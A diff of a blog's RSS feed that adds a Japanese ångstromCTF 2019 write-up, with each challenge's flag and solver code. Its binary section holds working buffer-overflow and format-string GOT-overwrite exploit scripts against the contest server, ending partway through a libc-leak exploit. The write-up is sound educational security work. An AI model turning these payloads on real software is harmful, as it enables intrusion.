@@ -80,8 +80,255 @@
     <description>Recent content in Posts on $ make life</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 03 Apr 2019 08:07:43 +0900</lastBuildDate>
+    <lastBuildDate>Thu, 25 Apr 2019 21:57:22 +0900</lastBuildDate>
     <atom:link href="https://owlinux1000.github.io/blog/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Angstrom2019</title>
+      <link>https://owlinux1000.github.io/blog/post/angstrom2019/</link>
+      <pubDate>Thu, 25 Apr 2019 21:57:22 +0900</pubDate>
+      <guid>https://owlinux1000.github.io/blog/post/angstrom2019/</guid>
+      <description>
+
+&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
+
+&lt;h3 id=&#34;irc&#34;&gt;IRC&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;freenodeに入るとFLAG&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{like_discord_but_worse}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;the-mueller-report&#34;&gt;The mueller Report&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;PDFが渡されるので、とりあえず&lt;code&gt;actf&lt;/code&gt;でgrepするとFLAG&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{no0o0o0_col1l1l1luuuusiioooon}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;blank-pdf&#34;&gt;Blank PDF&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;PDFが渡されるが開けず、&lt;code&gt;file&lt;/code&gt;コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{knot_very_interesting}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;paper-trail&#34;&gt;Paper Trail&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{fake_math_papers}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;scratch-it-out&#34;&gt;Scratch It Out&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる&lt;/li&gt;
+&lt;li&gt;project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される&lt;/li&gt;
+&lt;li&gt;最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる&lt;/li&gt;
+&lt;li&gt;地味に面白い&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{Th5_0pT1maL_LANgUaG3}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
+
+&lt;h3 id=&#34;control-you&#34;&gt;Control you&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;HTMLソースを見てFLAG&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{control_u_so_we_can&amp;rsquo;t_control_you}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
+
+&lt;h3 id=&#34;classy-cipher&#34;&gt;Classy Cipher&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{so_charming}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;:&amp;lt;M?TLH8&amp;lt;A:KFBG@V&amp;#39;&lt;/span&gt;
+
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;):
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; encrypted:
+        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;chr&lt;/span&gt;((&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(c)&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;i) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;), end&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&#34;really-secure-algorithm&#34;&gt;Really Secure Algorithm&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;RSAのパラメータがe, p, q, cが渡されるので復号するだけ&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{really_securent_algorithm}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;require_relative &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;../../tools/ctf/crypto.rb&amp;#39;&lt;/span&gt;
+
+&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889&lt;/span&gt;
+q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493&lt;/span&gt;
+e &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;65537&lt;/span&gt;
+c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349&lt;/span&gt;
+
+rsa &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;RSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new(e, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; q, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt;, q)
+m &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; rsa&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;decrypt(c)
+&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;m&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;pack(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2 id=&#34;half-and-half&#34;&gt;Half and Half&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;ソースコードが渡されるので呼んでソルバを書くだけ
+
+&lt;ul&gt;
+&lt;li&gt;24文字を12byteに分割しxor取った値に等しくなるようにする&lt;/li&gt;
+&lt;li&gt;フラグフォーマットは、&lt;code&gt;actf{&lt;/code&gt;なので先頭5byteと後半の5byteもxorして判明(&lt;code&gt;taste&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;問題文から&lt;code&gt;taste&lt;/code&gt;に合うような単語で&lt;code&gt;coffee&lt;/code&gt;を&lt;code&gt;actf{&lt;/code&gt;の後に繋げると後半が&lt;code&gt;good&lt;/code&gt;と文章が成り立つ&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{coffee_tastes_good}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;runes&#34;&gt;Runes&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ
+
+&lt;ul&gt;
+&lt;li&gt;復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{crypto_lives}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;gmp&amp;#39;&lt;/span&gt;
+
+n &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648883&lt;/span&gt;)
+&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;310013024566643256138761337388255591613&lt;/span&gt;
+q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;319848228152346890121384041219876391791&lt;/span&gt;
+g &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648884&lt;/span&gt;)
+c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869&lt;/span&gt;)
+l &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z((&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;lcm(q &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;))
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;L&lt;/span&gt;(u, n)
+  (u &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#b68&#34;&gt;/ n
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;end
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;c_lambda = L(c.powmod(l, n.pow(2)), n)
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;print([m].pack(&amp;#34;H*&amp;#34;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2 id=&#34;binary&#34;&gt;Binary&lt;/h2&gt;
+
+&lt;h3 id=&#34;aquarium&#34;&gt;Aquarium&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{overflowed_more_than_just_a_fish_tank}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
+z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19305&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x98&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x4011b6&lt;/span&gt;)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&#34;chain-of-rope&#34;&gt;Chain of Rope&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{dark_web_bargains}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+
+z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;9999&lt;/span&gt;
+z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19400&lt;/span&gt;
+
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;access&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x38&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x401231&lt;/span&gt;)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+
+&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&#34;purchases&#34;&gt;Purchases&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる&lt;/li&gt;
+&lt;li&gt;関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする
+
+&lt;ul&gt;
+&lt;li&gt;末尾2byteですむので楽に書き換えられる&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{limited_edition_flag}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
+z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19011&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4534c%10$hnAAAA&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;else. &amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&#34;returns&#34;&gt;Returns&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ&lt;/li&gt;
+&lt;li&gt;libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う&lt;/li&gt;
+&lt;li&gt;出力バイトの関係から分割して書き込むために、はじめに&lt;code&gt;puts@got&lt;/code&gt;をmainに書き換えておき何度もFSBを使えるようにする&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える&lt;/li&gt;
+&lt;li&gt;最後に、&lt;code&gt;puts@got&lt;/code&gt;を&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;になおしてあげればOne gadgetが実行される&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;actf{no_returns_allowed}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: utf-8&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
+z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19307&lt;/span&gt;
+context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
+libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;shell.actf.co&amp;#34;, 19011&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Leaking libc address and overwriting puts@got to the entrypoint of main function&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4518c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
+data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
+data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gsub(&lt;span style=&#34;color:#b68&#34;&gt;/\s/&lt;/span&gt;,&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
+libc_start_main &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/BBB(.*)@@\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;chop&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;240&lt;/span&gt;
+libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_start_main &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;__libc_start_main&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
